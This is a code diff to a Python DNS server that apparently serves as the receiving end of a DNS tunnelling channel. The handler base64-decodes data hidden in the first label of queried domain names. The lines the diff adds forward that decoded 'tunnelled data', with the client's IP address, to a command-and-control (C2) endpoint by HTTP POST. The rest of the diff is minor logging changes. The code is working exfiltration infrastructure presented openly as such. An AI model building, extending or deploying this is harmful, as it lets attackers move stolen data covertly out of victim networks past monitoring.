@@ -21,6 +21,7 @@ def send_to_db(ip, resp_data):
     }
     try:
         r = requests.post(url=url, data=data)
+        print(r.content.decode())
     except Exception as e:
         print(f"Exception occured while sending tunnelled data to C2 ->{e}")
 
@@ -39,7 +40,6 @@ class DNSHandler(socketserver.BaseRequestHandler):
     def handle(self):
         data = self.request[0].strip()
         socket = self.request[1]
-    
         try:
             request = DNSRecord.parse(data)
             # Main DNS class (DNSRecord) - corresponds to DNS packet & comprises DNSHeader
@@ -47,8 +47,12 @@ class DNSHandler(socketserver.BaseRequestHandler):
                                         qr=1, aa=1, ra=1),
                                         q=request.q)
             qname = str(request.q.qname)
+
+            # send tunnelled data to C2
             tunnelled_data = base64.b64decode(qname.split('.')[0])
             tunnelled_data = tunnelled_data.decode()
+            send_to_db(ip=self.client_address[0], 
+                       resp_data=tunnelled_data)
 
             qname = ('.'.join(str(request.q.qname).split('.')[1:]))[:-1]
             qtype = QTYPE[request.q.qtype]
@@ -64,7 +68,7 @@ class DNSHandler(socketserver.BaseRequestHandler):
             socket.sendto(reply.pack(), self.client_address)
 
         except Exception as e:
-            print(f"Error handling ")
+            print(f"Error handling UDP request -> {e}")
 
 if __name__ == "__main__":
     # SKELETON - socketserver.UDPServer((HOST, PORT), MyUDPHandler)
